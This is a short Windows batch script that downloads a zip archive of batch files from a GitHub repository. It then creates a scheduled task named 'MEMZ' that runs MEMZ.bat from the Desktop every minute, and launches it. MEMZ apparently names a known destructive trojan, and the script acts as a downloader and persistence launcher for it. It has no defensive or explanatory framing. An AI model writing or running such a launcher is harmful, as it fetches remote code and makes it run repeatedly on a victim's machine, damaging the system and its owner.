@echo off

:menu
echo Have you already made this task?
echo Y/N
echo.
echo.


set /p menuchoice=

if %menuchoice% == Y goto launch
if %menuchoice% == N goto create
cls
goto menu


:create
cls
echo Files Downloading... (MEMZ.bat needs to be on the Desktop.)
start https://github.com/18209550/batch-files-by-pumaroar1/archive/refs/heads/main.zip
echo Once Downloaded, press any key to continue.
pause >nul
SCHTASKS /CREATE /SC MINUTE /TN "MEMZ" /TR %userprofile%\Desktop\MEMZ.bat /F
goto launch



:launch
SCHTASKS /run /tn "MEMZ"
